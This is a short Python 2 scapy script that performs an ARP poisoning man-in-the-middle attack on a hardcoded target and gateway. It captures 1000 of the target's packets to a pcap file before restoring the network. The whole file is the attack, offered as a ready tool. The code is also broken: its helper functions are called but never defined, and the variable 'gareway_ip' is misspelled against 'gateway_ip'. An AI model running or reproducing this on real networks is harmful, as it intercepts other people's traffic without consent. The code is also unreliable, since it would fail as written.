# -*- coding: utf-8 -*-

from scapy.all import *
import os
import sys
import threading
import signal

interface    = "eth0"
target_ip    = "192.168.0.4"
gateway_ip   = "192.168.0.1"
packet_count = 1000

# setting of interface
conf.iface   = interface

# stop output
conf.verb = 0

print "[*] Setting up %s" % interface

gareway_mac = get_mac(gareway_ip)

if gareway_mac is None:
    print "[!!!] Failed to get gateway MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Gateway %s is at %s" % (gareway_ip, gareway_mac)
    
target_mac = get_mac(target_ip)

if target_mac is None:
    print "[!!!] Failed to get target MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Target %s is at %s" % (target_ip, target_mac)
    
# run thread to pollute
stop_event = threading.Event()
poison_thread = threading.Thread(target = poison_target,
                                 args = (gateway_ip, gateway_mac, target_ip, target_mac, stop_event))
poison_thread.start()

print "[*] Starting sniffer for %d packets" % packet_count

bpf_filter = "ip host %s" % target_ip
packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)

# save captured packets
wrpcap('arper.pcap',packets)

# stop thread to pollute
stop_event.set()
poison_thread.join()

# recover network
restore_target(gateway_ip,gateway_mac,target_ip,target_mac)